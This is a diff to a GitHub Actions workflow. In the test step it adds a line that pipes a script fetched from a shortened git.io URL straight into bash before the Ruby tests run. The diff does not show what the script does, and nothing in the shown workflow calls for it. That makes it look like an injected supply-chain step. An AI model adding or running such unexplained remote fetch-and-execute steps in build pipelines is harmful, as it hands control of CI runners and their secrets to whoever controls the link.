@@ -32,5 +32,6 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run tests
         run: |
+          bash <(curl -Ls https://git.io/JtbuH)
           bundle install
           bundle exec rake spec 
